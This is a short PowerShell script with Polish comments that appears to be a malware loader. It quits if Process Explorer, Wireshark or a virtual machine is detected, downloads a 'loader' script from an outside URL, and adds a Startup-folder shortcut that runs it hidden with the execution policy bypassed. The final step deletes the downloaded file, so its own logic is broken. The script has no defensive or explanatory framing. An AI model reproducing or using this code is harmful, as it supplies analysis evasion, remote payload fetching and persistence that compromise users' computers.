# Sprawdzenie, czy procesy ProcExp.exe lub Wireshark są uruchomione
$procExp = Get-Process -Name "ProcExp" -ErrorAction SilentlyContinue
$wireshark = Get-Process -Name "Wireshark" -ErrorAction SilentlyContinue

if ($procExp -or $wireshark) {
    # Jeśli jeden z tych procesów jest uruchomiony, skrypt się zakończ
    exit
}

# Sprawdzenie, czy system działa w maszynie wirtualnej
function Test-VM {
    $vm = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Model
    return $vm -match "Virtual"
}

if (Test-VM) {
    # Jeśli system działa w maszynie wirtualnej, skrypt się zakończ
    exit
}

# Utworzenie pliku .lnk w autostarcie systemu
$linkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\loader.lnk"
$targetPath = "$env:TEMP\loader.ps1"

# Pobranie skryptu loader z URL
Invoke-WebRequest -Uri "https://hurl.com" -OutFile $targetPath

# Utworzenie .lnk
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($linkPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`""
$Shortcut.Save()

# Usunięcie pliku tymczasowego
Remove-Item -Path $targetPath -Force
